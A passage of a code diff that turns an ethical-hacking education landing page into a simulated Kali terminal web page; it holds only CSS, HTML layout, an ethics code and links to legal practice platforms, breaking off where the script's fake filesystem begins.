@@ -3,1141 +3,654 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>HackLab — White Hat Security Education</title>
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<title>HackLab Terminal — Practice Shell</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
 <style>
   :root {
-    --bg-0: #05070d;
-    --bg-1: #0a0e1a;
-    --bg-2: #0f1420;
-    --panel: #111827;
-    --panel-2: #1a2235;
-    --border: #1f2a44;
-    --border-glow: #2dd4bf;
-    --accent: #2dd4bf;
-    --accent-2: #22d3ee;
-    --accent-3: #a855f7;
-    --text: #e6edf7;
-    --text-dim: #8b97b0;
-    --success: #22c55e;
-    --warning: #f59e0b;
-    --danger: #ef4444;
-    --sidebar-w: 260px;
+    --bg: #0a0e14;
+    --panel: #0d1319;
+    --border: #1a2332;
+    --text: #c9d1d9;
+    --green: #7ee787;
+    --cyan: #79c0ff;
+    --yellow: #ffd866;
+    --red: #ff7b72;
+    --purple: #d2a8ff;
+    --dim: #6e7681;
   }
-
   * { box-sizing: border-box; margin: 0; padding: 0; }
-
   html, body {
     height: 100%;
-    background: var(--bg-0);
+    background: var(--bg);
     color: var(--text);
-    font-family: 'Inter', system-ui, sans-serif;
-    overflow-x: hidden;
-    scroll-behavior: smooth;
-  }
-
-  body {
-    display: flex;
-    background:
-      radial-gradient(circle at 15% 0%, rgba(45, 212, 191, 0.08), transparent 45%),
-      radial-gradient(circle at 85% 100%, rgba(168, 85, 247, 0.08), transparent 45%),
-      var(--bg-0);
-  }
-
-  code, .mono { font-family: 'JetBrains Mono', monospace; }
-
-  /* ================= SIDEBAR ================= */
-  .sidebar {
-    width: var(--sidebar-w);
-    min-height: 100vh;
-    background: linear-gradient(180deg, var(--bg-1), var(--bg-0));
-    border-right: 1px solid var(--border);
-    padding: 1.5rem 1rem;
-    position: fixed;
-    top: 0;
-    left: 0;
-    display: flex;
-    flex-direction: column;
-    gap: 0.5rem;
-    transition: transform 0.3s ease;
-    z-index: 1000;
-  }
-
-  .brand {
-    display: flex;
-    align-items: center;
-    gap: 0.7rem;
-    padding: 0.5rem 0.75rem 1.5rem;
-    border-bottom: 1px solid var(--border);
-    margin-bottom: 1rem;
-  }
-
-  .brand-icon {
-    width: 38px;
-    height: 38px;
-    border-radius: 10px;
-    background: linear-gradient(135deg, var(--accent), var(--accent-3));
-    display: grid;
-    place-items: center;
-    font-weight: 800;
-    font-size: 1.1rem;
-    color: #06121a;
-    box-shadow: 0 0 20px rgba(45, 212, 191, 0.4);
-  }
-
-  .brand-text {
-    font-weight: 800;
-    font-size: 1.15rem;
-    letter-spacing: -0.5px;
-    background: linear-gradient(90deg, var(--accent), var(--accent-2));
-    -webkit-background-clip: text;
-    background-clip: text;
-    color: transparent;
-  }
-
-  .brand-sub {
-    font-size: 0.65rem;
-    color: var(--text-dim);
-    letter-spacing: 1.5px;
-    text-transform: uppercase;
-  }
-
-  .nav-label {
-    font-size: 0.68rem;
-    text-transform: uppercase;
-    letter-spacing: 1.5px;
-    color: var(--text-dim);
-    padding: 0.75rem 0.75rem 0.4rem;
-    font-weight: 600;
-  }
-
-  .side-nav {
-    display: flex;
-    flex-direction: column;
-    gap: 0.15rem;
-    list-style: none;
-  }
-
-  .side-nav a {
-    display: flex;
-    align-items: center;
-    gap: 0.75rem;
-    padding: 0.65rem 0.8rem;
-    border-radius: 8px;
-    color: var(--text-dim);
-    text-decoration: none;
-    font-size: 0.9rem;
-    font-weight: 500;
-    transition: all 0.2s ease;
-    border-left: 2px solid transparent;
-    position: relative;
-  }
-
-  .side-nav a:hover {
-    background: var(--panel);
-    color: var(--text);
-    border-left-color: var(--accent);
-  }
-
-  .side-nav a.active {
-    background: linear-gradient(90deg, rgba(45, 212, 191, 0.12), transparent);
-    color: var(--accent);
-    border-left-color: var(--accent);
-  }
-
-  .side-nav .icon {
-    width: 18px;
-    height: 18px;
-    stroke: currentColor;
-    stroke-width: 2;
-    fill: none;
-    flex-shrink: 0;
-  }
-
-  .sidebar-footer {
-    margin-top: auto;
-    padding: 1rem 0.75rem 0;
-    border-top: 1px solid var(--border);
-    font-size: 0.7rem;
-    color: var(--text-dim);
-    line-height: 1.5;
-  }
-
-  .status-dot {
-    display: inline-block;
-    width: 8px;
-    height: 8px;
-    border-radius: 50%;
-    background: var(--success);
-    box-shadow: 0 0 8px var(--success);
-    margin-right: 0.4rem;
-    animation: pulse 2s infinite;
-  }
-
-  @keyframes pulse {
-    0%, 100% { opacity: 1; }
-    50% { opacity: 0.5; }
-  }
-
-  /* ================= MAIN ================= */
-  .main {
-    flex: 1;
-    margin-left: var(--sidebar-w);
-    min-width: 0;
-  }
-
-  /* Top bar */
-  .topbar {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    padding: 1rem 2rem;
-    border-bottom: 1px solid var(--border);
-    background: rgba(10, 14, 26, 0.75);
-    backdrop-filter: blur(12px);
-    position: sticky;
-    top: 0;
-    z-index: 100;
-  }
-
-  .topbar-title {
-    font-size: 0.85rem;
-    color: var(--text-dim);
     font-family: 'JetBrains Mono', monospace;
+    font-size: 14px;
+    overflow: hidden;
   }
 
-  .topbar-title strong { color: var(--accent); }
-
-  .topbar-actions {
+  .window {
+    height: 100vh;
     display: flex;
+    flex-direction: column;
+    background: var(--bg);
+  }
+
+  .titlebar {
+    display: flex;
+    align-items: center;
     gap: 0.6rem;
-    align-items: center;
-  }
-
-  .btn {
-    display: inline-flex;
-    align-items: center;
-    gap: 0.5rem;
-    padding: 0.55rem 1rem;
-    border-radius: 8px;
-    font-size: 0.82rem;
-    font-weight: 600;
-    text-decoration: none;
-    cursor: pointer;
-    border: 1px solid var(--border);
-    background: var(--panel);
-    color: var(--text);
-    transition: all 0.2s;
-    font-family: inherit;
-  }
-
-  .btn:hover {
-    border-color: var(--accent);
-    color: var(--accent);
-    transform: translateY(-1px);
-  }
-
-  .btn-primary {
-    background: linear-gradient(135deg, var(--accent), var(--accent-2));
-    color: #04121a;
-    border: none;
-    box-shadow: 0 0 20px rgba(45, 212, 191, 0.3);
-  }
-
-  .btn-primary:hover {
-    color: #04121a;
-    box-shadow: 0 0 30px rgba(45, 212, 191, 0.55);
-  }
-
-  .menu-toggle {
-    display: none;
-    background: none;
-    border: 1px solid var(--border);
-    color: var(--text);
-    padding: 0.5rem;
-    border-radius: 8px;
-    cursor: pointer;
-  }
-
-  /* ================= CONTENT ================= */
-  .content { padding: 3rem 2.5rem; max-width: 1200px; }
-
-  /* HERO */
-  .hero {
-    padding: 3rem 0 4rem;
-    position: relative;
-  }
-
-  .badge {
-    display: inline-flex;
-    align-items: center;
-    gap: 0.5rem;
-    padding: 0.4rem 0.9rem;
-    border-radius: 100px;
-    background: rgba(45, 212, 191, 0.08);
-    border: 1px solid rgba(45, 212, 191, 0.3);
-    color: var(--accent);
-    font-size: 0.75rem;
-    font-weight: 600;
-    margin-bottom: 1.5rem;
-  }
-
-  .hero h1 {
-    font-size: clamp(2rem, 5.5vw, 3.5rem);
-    font-weight: 800;
-    letter-spacing: -1.5px;
-    line-height: 1.1;
-    margin-bottom: 1.2rem;
-    background: linear-gradient(135deg, #fff 0%, var(--accent) 50%, var(--accent-3) 100%);
-    -webkit-background-clip: text;
-    background-clip: text;
-    color: transparent;
-    max-width: 900px;
-  }
-
-  .hero p {
-    font-size: 1.05rem;
-    color: var(--text-dim);
-    max-width: 640px;
-    line-height: 1.7;
-    margin-bottom: 2rem;
-  }
-
-  .hero-actions {
-    display: flex;
-    gap: 0.8rem;
-    flex-wrap: wrap;
-  }
-
-  /* Stats strip */
-  .stats {
-    display: grid;
-    grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
-    gap: 1rem;
-    margin-top: 3rem;
-  }
-
-  .stat {
-    padding: 1.2rem;
-    background: var(--panel);
-    border: 1px solid var(--border);
-    border-radius: 12px;
-    transition: all 0.25s;
-  }
-
-  .stat:hover {
-    border-color: var(--accent);
-    transform: translateY(-3px);
-    box-shadow: 0 10px 30px -10px rgba(45, 212, 191, 0.3);
-  }
-
-  .stat-num {
-    font-size: 1.6rem;
-    font-weight: 800;
-    background: linear-gradient(135deg, var(--accent), var(--accent-2));
-    -webkit-background-clip: text;
-    background-clip: text;
-    color: transparent;
-  }
-
-  .stat-label {
-    font-size: 0.78rem;
-    color: var(--text-dim);
-    margin-top: 0.3rem;
-    text-transform: uppercase;
-    letter-spacing: 1px;
-  }
-
-  /* SECTION */
-  section.block {
-    padding: 4rem 0;
-    border-top: 1px solid var(--border);
-  }
-
-  .section-head {
-    margin-bottom: 2.5rem;
-  }
-
-  .section-tag {
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 0.75rem;
-    color: var(--accent);
-    letter-spacing: 2px;
-    text-transform: uppercase;
-    margin-bottom: 0.6rem;
-  }
-
-  .section-title {
-    font-size: clamp(1.5rem, 3vw, 2.2rem);
-    font-weight: 800;
-    letter-spacing: -0.8px;
-    margin-bottom: 0.6rem;
-  }
-
-  .section-desc {
-    color: var(--text-dim);
-    max-width: 620px;
-    line-height: 1.6;
-  }
-
-  /* CARDS */
-  .grid {
-    display: grid;
-    grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-    gap: 1.25rem;
-  }
-
-  .card {
-    background: linear-gradient(180deg, var(--panel), var(--bg-2));
-    border: 1px solid var(--border);
-    border-radius: 14px;
-    padding: 1.5rem;
-    transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-    position: relative;
-    overflow: hidden;
-    cursor: pointer;
-  }
-
-  .card::after {
-    content: "";
-    position: absolute;
-    inset: 0;
-    border-radius: 14px;
-    background: radial-gradient(circle at top right, rgba(45, 212, 191, 0.15), transparent 60%);
-    opacity: 0;
-    transition: opacity 0.3s;
-    pointer-events: none;
-  }
-
-  .card:hover {
-    transform: translateY(-5px);
-    border-color: var(--accent);
-    box-shadow: 0 20px 40px -20px rgba(45, 212, 191, 0.4);
-  }
-
-  .card:hover::after { opacity: 1; }
-
-  .card-icon {
-    width: 44px;
-    height: 44px;
-    border-radius: 11px;
-    background: linear-gradient(135deg, rgba(45, 212, 191, 0.15), rgba(168, 85, 247, 0.15));
-    border: 1px solid var(--border);
-    display: grid;
-    place-items: center;
-    margin-bottom: 1rem;
-    font-size: 1.2rem;
-  }
-
-  .card h3 {
-    font-size: 1.05rem;
-    font-weight: 700;
-    margin-bottom: 0.5rem;
-    color: var(--text);
-  }
-
-  .card p {
-    font-size: 0.88rem;
-    line-height: 1.6;
-    color: var(--text-dim);
-    margin-bottom: 1rem;
-  }
-
-  .pill {
-    display: inline-block;
-    padding: 0.25rem 0.65rem;
-    font-size: 0.68rem;
-    font-weight: 700;
-    letter-spacing: 0.5px;
-    text-transform: uppercase;
-    border-radius: 100px;
-    background: rgba(45, 212, 191, 0.1);
-    color: var(--accent);
-    border: 1px solid rgba(45, 212, 191, 0.25);
-  }
-
-  .pill.purple { background: rgba(168, 85, 247, 0.1); color: var(--accent-3); border-color: rgba(168, 85, 247, 0.3); }
-  .pill.orange { background: rgba(245, 158, 11, 0.1); color: var(--warning); border-color: rgba(245, 158, 11, 0.3); }
-  .pill.blue   { background: rgba(34, 211, 238, 0.1); color: var(--accent-2); border-color: rgba(34, 211, 238, 0.3); }
-
-  /* TERMINAL */
-  .terminal {
-    background: #05070d;
-    border: 1px solid var(--border);
-    border-radius: 14px;
-    overflow: hidden;
-    box-shadow: 0 20px 50px -20px rgba(0, 0, 0, 0.8);
-    margin-top: 1.5rem;
-  }
-
-  .term-header {
-    display: flex;
-    align-items: center;
-    gap: 0.5rem;
     padding: 0.7rem 1rem;
     background: var(--panel);
     border-bottom: 1px solid var(--border);
+    user-select: none;
   }
-
-  .dot { width: 11px; height: 11px; border-radius: 50%; }
+  .dot { width: 12px; height: 12px; border-radius: 50%; }
   .dot.r { background: #ff5f56; }
   .dot.y { background: #ffbd2e; }
   .dot.g { background: #27c93f; }
 
-  .term-title {
-    margin-left: auto;
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 0.72rem;
-    color: var(--text-dim);
+  .title {
+    flex: 1;
+    text-align: center;
+    color: var(--dim);
+    font-size: 0.75rem;
   }
 
-  .term-body {
-    padding: 1.2rem;
-    height: 280px;
+  .tab-hint {
+    display: flex;
+    gap: 0.4rem;
+    font-size: 0.7rem;
+    color: var(--dim);
+  }
+  .tab-hint span {
+    padding: 0.15rem 0.5rem;
+    border: 1px solid var(--border);
+    border-radius: 4px;
+  }
+
+  .term {
+    flex: 1;
     overflow-y: auto;
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 0.85rem;
-    line-height: 1.7;
+    padding: 1.2rem 1.5rem;
+    line-height: 1.6;
+    white-space: pre-wrap;
+    word-break: break-word;
   }
 
-  .term-body .line { white-space: pre-wrap; word-break: break-word; }
-  .term-body .prompt { color: var(--accent); font-weight: 600; }
-  .term-body .out { color: var(--text); }
-  .term-body .err { color: var(--danger); }
-  .term-body .muted { color: var(--text-dim); }
+  .term::-webkit-scrollbar { width: 10px; }
+  .term::-webkit-scrollbar-track { background: var(--bg); }
+  .term::-webkit-scrollbar-thumb { background: var(--border); border-radius: 5px; }
+  .term::-webkit-scrollbar-thumb:hover { background: #2a3546; }
 
-  .term-input-line {
+  .line { margin-bottom: 0.1rem; }
+
+  .prompt-user { color: var(--green); font-weight: 500; }
+  .prompt-host { color: var(--cyan); font-weight: 500; }
+  .prompt-path { color: var(--purple); font-weight: 500; }
+  .prompt-sym  { color: var(--dim); }
+
+  .out      { color: var(--text); }
+  .out-err  { color: var(--red); }
+  .out-warn { color: var(--yellow); }
+  .out-info { color: var(--cyan); }
+  .out-ok   { color: var(--green); }
+  .dim      { color: var(--dim); }
+
+  .input-line {
     display: flex;
     align-items: center;
-    gap: 0.6rem;
+    padding: 0.6rem 1.5rem 1rem;
     border-top: 1px solid var(--border);
-    padding: 0.8rem 1.2rem;
-    background: rgba(17, 24, 39, 0.5);
-    font-family: 'JetBrains Mono', monospace;
+    background: var(--panel);
   }
 
-  .term-input-line span { color: var(--accent); font-size: 0.85rem; font-weight: 600; }
+  .input-line .prompt {
+    margin-right: 0.6rem;
+    font-size: 0.85rem;
+    white-space: nowrap;
+  }
 
-  .term-input-line input {
+  #cmd {
     flex: 1;
     background: transparent;
     border: none;
     outline: none;
     color: var(--text);
     font-family: inherit;
-    font-size: 0.85rem;
+    font-size: 0.9rem;
+    caret-color: var(--green);
   }
 
-  /* ETHICS GRID */
-  .ethics-grid {
-    display: grid;
-    grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
-    gap: 1rem;
-  }
-
-  .ethic {
-    background: var(--panel);
-    border: 1px solid var(--border);
-    border-left: 3px solid var(--accent);
-    border-radius: 10px;
-    padding: 1.2rem;
-    transition: all 0.25s;
-  }
-
-  .ethic:hover {
-    background: var(--panel-2);
-    transform: translateX(4px);
-    border-left-color: var(--accent-3);
-  }
-
-  .ethic .num {
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 0.75rem;
-    color: var(--accent);
-    font-weight: 700;
-    margin-bottom: 0.4rem;
-  }
-
-  .ethic h4 { font-size: 0.95rem; margin-bottom: 0.4rem; }
-  .ethic p { font-size: 0.82rem; color: var(--text-dim); line-height: 1.5; }
-
-  /* RESOURCES */
-  .resource-grid {
-    display: grid;
-    grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
-    gap: 0.8rem;
-  }
-
-  .resource {
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    padding: 0.9rem 1.1rem;
-    background: var(--panel);
-    border: 1px solid var(--border);
-    border-radius: 10px;
-    color: var(--text);
-    text-decoration: none;
-    font-size: 0.87rem;
-    font-weight: 500;
-    transition: all 0.2s;
-  }
-
-  .resource:hover {
-    border-color: var(--accent);
-    background: var(--panel-2);
-    transform: translateY(-2px);
-    color: var(--accent);
-  }
-
-  .resource .arrow { color: var(--text-dim); transition: 0.2s; }
-  .resource:hover .arrow { color: var(--accent); transform: translateX(3px); }
-
-  /* FOOTER */
-  footer {
-    padding: 2.5rem 2.5rem 2rem;
-    border-top: 1px solid var(--border);
-    color: var(--text-dim);
-    font-size: 0.82rem;
-    display: flex;
-    justify-content: space-between;
-    flex-wrap: wrap;
-    gap: 1rem;
-    max-width: 1200px;
-  }
-
-  footer strong { color: var(--accent); }
-
-  /* ================= RESPONSIVE ================= */
-  @media (max-width: 900px) {
-    .sidebar {
-      transform: translateX(-100%);
-      box-shadow: 10px 0 40px rgba(0,0,0,0.6);
-    }
-    .sidebar.open { transform: translateX(0); }
-    .main { margin-left: 0; }
-    .menu-toggle { display: grid; place-items: center; }
-    .topbar { padding: 0.9rem 1.2rem; }
-    .content { padding: 2rem 1.2rem; }
-    footer { padding: 2rem 1.2rem; }
-    .hero { padding: 2rem 0 3rem; }
-  }
-
-  @media (max-width: 500px) {
-    .topbar-actions .btn span { display: none; }
-    .hero-actions { flex-direction: column; }
-    .hero-actions .btn { justify-content: center; width: 100%; }
-  }
-
-  /* ================= ANIMATIONS ================= */
-  @keyframes blink {
-    50% { opacity: 0; }
-  }
-  .cursor {
+  .cursor-blink {
     display: inline-block;
     width: 8px;
-    height: 1em;
-    background: var(--accent);
-    animation: blink 1s steps(2) infinite;
+    height: 1.05em;
+    background: var(--green);
     vertical-align: text-bottom;
-    margin-left: 2px;
+    animation: blink 1s steps(2) infinite;
   }
+  @keyframes blink { 50% { opacity: 0; } }
 
-  .fade-up {
-    opacity: 0;
-    transform: translateY(20px);
-    animation: fadeUp 0.6s ease forwards;
+  .ascii {
+    color: var(--green);
+    font-size: 0.7rem;
+    line-height: 1.1;
   }
-  @keyframes fadeUp {
-    to { opacity: 1; transform: translateY(0); }
-  }
-
-  /* Scrollbar */
-  ::-webkit-scrollbar { width: 8px; height: 8px; }
-  ::-webkit-scrollbar-track { background: var(--bg-1); }
-  ::-webkit-scrollbar-thumb {
-    background: var(--border);
-    border-radius: 4px;
-  }
-  ::-webkit-scrollbar-thumb:hover { background: var(--accent); }
-
-  /* Mobile overlay */
-  .overlay {
-    display: none;
-    position: fixed;
-    inset: 0;
-    background: rgba(0,0,0,0.6);
-    backdrop-filter: blur(2px);
-    z-index: 999;
-  }
-  .overlay.show { display: block; }
 </style>
 </head>
 <body>
 
-<!-- ============ SIDEBAR ============ -->
-<aside class="sidebar" id="sidebar">
-  <div class="brand">
-    <div class="brand-icon">H</div>
-    <div>
-      <div class="brand-text">HackLab</div>
-      <div class="brand-sub">White Hat Edu</div>
+<div class="window">
+  <div class="titlebar">
+    <span class="dot r"></span>
+    <span class="dot y"></span>
+    <span class="dot g"></span>
+    <div class="title">kali@hacklab: ~ — simulated shell v3</div>
+    <div class="tab-hint">
+      <span>↑↓ history</span>
+      <span>Tab complete</span>
     </div>
   </div>
 
-  <div class="nav-label">Navigation</div>
-  <ul class="side-nav">
-    <li>
-      <a href="#home" class="active">
-        <svg class="icon" viewBox="0 0 24 24"><path d="M3 12l9-9 9 9M5 10v10h14V10"/></svg>
-        Home
-      </a>
-    </li>
-    <li>
-      <a href="#learn">
-        <svg class="icon" viewBox="0 0 24 24"><path d="M4 19.5V6a2 2 0 012-2h12v16H6a2 2 0 01-2-2zM4 19.5A2.5 2.5 0 006.5 22H20"/></svg>
-        Learning Paths
-      </a>
-    </li>
-    <li>
-      <a href="#terminal">
-        <svg class="icon" viewBox="0 0 24 24"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
-        Terminal
-      </a>
-    </li>
-    <li>
-      <a href="#tools">
-        <svg class="icon" viewBox="0 0 24 24"><path d="M14.7 6.3a4 4 0 105.4 5.4L21 13l-8 8-2-2 8-8-1.3-1.3z"/><path d="M3 21l9-9"/></svg>
-        Tools
-      </a>
-    </li>
-    <li>
-      <a href="#ethics">
-        <svg class="icon" viewBox="0 0 24 24"><path d="M12 2l3 6 6 1-4.5 4.5L17 20l-5-3-5 3 1.5-6.5L4 9l6-1z"/></svg>
-        Ethics
-      </a>
-    </li>
-    <li>
-      <a href="#resources">
-        <svg class="icon" viewBox="0 0 24 24"><path d="M10 13a5 5 0 007 0l3-3a5 5 0 00-7-7l-1 1"/><path d="M14 11a5 5 0 00-7 0l-3 3a5 5 0 007 7l1-1"/></svg>
-        Resources
-      </a>
-    </li>
-  </ul>
+  <div class="term" id="term"></div>
 
-  <div class="sidebar-footer">
-    <div><span class="status-dot"></span>All systems operational</div>
-    <div style="margin-top:0.4rem;">v2.0 · Built for good 💚</div>
+  <div class="input-line">
+    <span class="prompt" id="prompt">
+      <span class="prompt-user">kali</span><span class="prompt-sym">@</span><span class="prompt-host">hacklab</span><span class="prompt-sym">:</span><span class="prompt-path">~</span><span class="prompt-sym">$</span>
+    </span>
+    <input id="cmd" autocomplete="off" autocapitalize="off" spellcheck="false" autofocus />
   </div>
-</aside>
-
-<div class="overlay" id="overlay"></div>
-
-<!-- ============ MAIN ============ -->
-<main class="main">
-
-  <!-- TOP BAR -->
-  <div class="topbar">
-    <button class="menu-toggle" id="menuToggle" aria-label="Toggle menu">
-      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-        <line x1="3" y1="6" x2="21" y2="6"/>
-        <line x1="3" y1="12" x2="21" y2="12"/>
-        <line x1="3" y1="18" x2="21" y2="18"/>
-      </svg>
-    </button>
-    <div class="topbar-title">~/hacklab/<strong id="currentSection">home</strong></div>
-    <div class="topbar-actions">
-      <a href="#resources" class="btn">📚 <span>Resources</span></a>
-      <a href="#learn" class="btn btn-primary">🚀 <span>Start Learning</span></a>
-    </div>
-  </div>
-
-  <div class="content">
-
-    <!-- HERO -->
-    <section class="hero" id="home">
-      <div class="badge fade-up">🛡️ &nbsp;Ethical hacking · Legal labs only</div>
-      <h1 class="fade-up" style="animation-delay:0.1s">
-        Master cybersecurity.<br/>The right way.
-      </h1>
-      <p class="fade-up" style="animation-delay:0.2s">
-        HackLab is your launchpad into white hat hacking — real skills, real labs, real defenses.
-        No black hats, no shortcuts, no shady business. Just you, a keyboard, and the pursuit of knowledge.
-      </p>
-      <div class="hero-actions fade-up" style="animation-delay:0.3s">
-        <a href="#learn" class="btn btn-primary">Start Learning →</a>
-        <a href="#terminal" class="btn">Open Terminal</a>
-      </div>
-
-      <div class="stats fade-up" style="animation-delay:0.4s">
-        <div class="stat">
-          <div class="stat-num">6+</div>
-          <div class="stat-label">Learning Paths</div>
-        </div>
-        <div class="stat">
-          <div class="stat-num">100%</div>
-          <div class="stat-label">Free Resources</div>
-        </div>
-        <div class="stat">
-          <div class="stat-num">24/7</div>
-          <div class="stat-label">Labs Available</div>
-        </div>
-        <div class="stat">
-          <div class="stat-num">∞</div>
-          <div class="stat-label">Curiosity Needed</div>
-        </div>
-      </div>
-    </section>
-
-    <!-- LEARNING PATHS -->
-    <section class="block" id="learn">
-      <div class="section-head">
-        <div class="section-tag">// 01 — Curriculum</div>
-        <h2 class="section-title">Learning Paths</h2>
-        <p class="section-desc">Structured tracks from zero to hero. Start anywhere, go everywhere.</p>
-      </div>
-
-      <div class="grid">
-        <div class="card">
-          <div class="card-icon">🌐</div>
-          <h3>Networking Basics</h3>
-          <p>TCP/IP, DNS, HTTP, packets, and how data actually flows across the internet.</p>
-          <span class="pill">Beginner</span>
-        </div>
-
-        <div class="card">
-          <div class="card-icon">🐧</div>
-          <h3>Linux Fundamentals</h3>
-          <p>Command line, permissions, processes, pipes, and the tools every hacker needs.</p>
-          <span class="pill">Beginner</span>
-        </div>
-
-        <div class="card">
-          <div class="card-icon">🕸️</div>
-          <h3>Web Security</h3>
-          <p>OWASP Top 10, XSS, SQLi, CSRF — understand attacks so you can stop them.</p>
-          <span class="pill blue">Intermediate</span>
-        </div>
-
-        <div class="card">
-          <div class="card-icon">🔐</div>
-          <h3>Cryptography</h3>
-          <p>Hashing, symmetric/asymmetric encryption, TLS handshakes, and PKI explained simply.</p>
-          <span class="pill blue">Intermediate</span>
-        </div>
-
-        <div class="card">
-          <div class="card-icon">🎯</div>
-          <h3>Penetration Testing</h3>
-          <p>Recon, scanning, exploitation, and professional reporting — all in legal labs.</p>
-          <span class="pill purple">Advanced</span>
-        </div>
-
-        <div class="card">
-          <div class="card-icon">🛡️</div>
-          <h3>Blue Team Defense</h3>
-          <p>Detection, logging, SIEM, incident response, and hardening enterprise systems.</p>
-          <span class="pill orange">Advanced</span>
-        </div>
-      </div>
-    </section>
-
-    <!-- TERMINAL -->
-    <section class="block" id="terminal">
-      <div class="section-head">
-        <div class="section-tag">// 02 — Interactive</div>
-        <h2 class="section-title">Try the Terminal</h2>
-        <p class="section-desc">Type <code style="color:var(--accent)">help</code> to get started. Try: about, learn, ethics, whoami, clear.</p>
-      </div>
-
-      <div class="terminal">
-        <div class="term-header">
-          <span class="dot r"></span>
-          <span class="dot y"></span>
-          <span class="dot g"></span>
-          <span class="term-title">user@hacklab: ~</span>
-        </div>
-        <div class="term-body" id="termBody"></div>
-        <form class="term-input-line" id="termForm">
-          <span>❯</span>
-          <input id="termInput" autocomplete="off" spellcheck="false" placeholder="type 'help'..." />
-        </form>
-      </div>
-    </section>
-
-    <!-- TOOLS -->
-    <section class="block" id="tools">
-      <div class="section-head">
-        <div class="section-tag">// 03 — Arsenal</div>
-        <h2 class="section-title">Legal Practice Tools</h2>
-        <p class="section-desc">Handpicked platforms to sharpen your skills — 100% legal, 100% awesome.</p>
-      </div>
-
-      <div class="grid">
-        <div class="card">
-          <div class="card-icon">🎮</div>
-          <h3>TryHackMe</h3>
-          <p>Guided, gamified labs for beginners — perfect for your first capture-the-flag.</p>
-          <span class="pill">Guided</span>
-        </div>
-        <div class="card">
-          <div class="card-icon">📦</div>
-          <h3>Hack The Box</h3>
-          <p>Realistic machines to exploit legally. Great for intermediate skills.</p>
-          <span class="pill blue">Realistic</span>
-        </div>
-        <div class="card">
-          <div class="card-icon">🧃</div>
-          <h3>OWASP Juice Shop</h3>
-          <p>A deliberately vulnerable web app for practicing modern web exploitation.</p>
-          <span class="pill purple">Web</span>
-        </div>
-        <div class="card">
-          <div class="card-icon">📡</div>
-          <h3>Wireshark</h3>
-          <p>Free packet analyzer — see exactly what flows through your network in real time.</p>
-          <span class="pill orange">Network</span>
-        </div>
-      </div>
-    </section>
-
-    <!-- ETHICS -->
-    <section class="block" id="ethics">
-      <div class="section-head">
-        <div class="section-tag">// 04 — Code of Conduct</div>
-        <h2 class="section-title">The White Hat Code</h2>
-        <p class="section-desc">Skill without ethics is a weapon. These four rules separate hackers from criminals.</p>
-      </div>
-
-      <div class="ethics-grid">
-        <div class="ethic">
-          <div class="num">01</div>
-          <h4>Permission First</h4>
-          <p>Never test a system you don't own or have written authorization to test.</p>
-        </div>
-        <div class="ethic">
-          <div class="num">02</div>
-          <h4>Do No Harm</h4>
-          <p>Don't damage, delete, or leak data. Document findings and report responsibly.</p>
-        </div>
-        <div class="ethic">
-          <div class="num">03</div>
-          <h4>Stay Legal</h4>
-          <p>Laws like CFAA (US), CMA (UK), and GDPR (EU) apply. Know them before you act.</p>
-        </div>
-        <div class="ethic">
-          <div class="num">04</div>
-          <h4>Keep Learning</h4>
-          <p>The best hackers are the most curious. Read, lab, repeat — forever.</p>
-        </div>
-      </div>
-    </section>
-
-    <!-- RESOURCES -->
-    <section class="block" id="resources">
-      <div class="section-head">
-        <div class="section-tag">// 05 — Vault</div>
-        <h2 class="section-title">Free Resources</h2>
-        <p class="section-desc">Curated links to legit training platforms. No piracy, no sketchy links.</p>
-      </div>
-
-      <div class="resource-grid">
-        <a class="resource" href="https://tryhackme.com" target="_blank" rel="noopener">
-          TryHackMe <span class="arrow">→</span>
-        </a>
-        <a class="resource" href="https://www.hackthebox.com" target="_blank" rel="noopener">
-          Hack The Box <span class="arrow">→</span>
-        </a>
-        <a class="resource" href="https://owasp.org/www-project-top-ten/" target="_blank" rel="noopener">
-          OWASP Top 10 <span class="arrow">→</span>
-        </a>
-        <a class="resource" href="https://www.wireshark.org" target="_blank" rel="noopener">
-          Wireshark <span class="arrow">→</span>
-        </a>
-        <a class="resource" href="https://www.kali.org" target="_blank" rel="noopener">
-          Kali Linux <span class="arrow">→</span>
-        </a>
-        <a class="resource" href="https://overthewire.org/wargames/" target="_blank" rel="noopener">
-          OverTheWire <span class="arrow">→</span>
-        </a>
-        <a class="resource" href="https://picoctf.org" target="_blank" rel="noopener">
-          picoCTF <span class="arrow">→</span>
-        </a>
-        <a class="resource" href="https://portswigger.net/web-security" target="_blank" rel="noopener">
-          PortSwigger Academy <span class="arrow">→</span>
-        </a>
-      </div>
-    </section>
-
-  </div>
-
-  <footer>
-    <div>© 2025 <strong>HackLab</strong> — Built for education. Hack responsibly. 💚</div>
-    <div class="mono" style="font-size:0.75rem;">stay curious · stay legal</div>
-  </footer>
-
-</main>
+</div>
 
 <script>
-  // ============ SIDEBAR TOGGLE ============
-  const sidebar = document.getElementById('sidebar');
-  const overlay = document.getElementById('overlay');
-  const menuToggle = document.getElementById('menuToggle');
+/* =========================================================
+   HackLab Terminal — Simulated Kali Shell
+   Educational use only. No real network/system access.
+   ========================================================= */
 
-  menuToggle.addEventListener('click', () => {
-    sidebar.classList.toggle('open');
-    overlay.classList.toggle('show');
-  });
+const term = document.getElementById('term');
+const input = document.getElementById('cmd');
+const promptEl = document.getElementById('prompt');
 
-  overlay.addEventListener('click', () => {
-    sidebar.classList.remove('open');
-    overlay.classList.remove('show');
-  });
+/* ---------- Fake filesystem ---------- */
+const fs = {
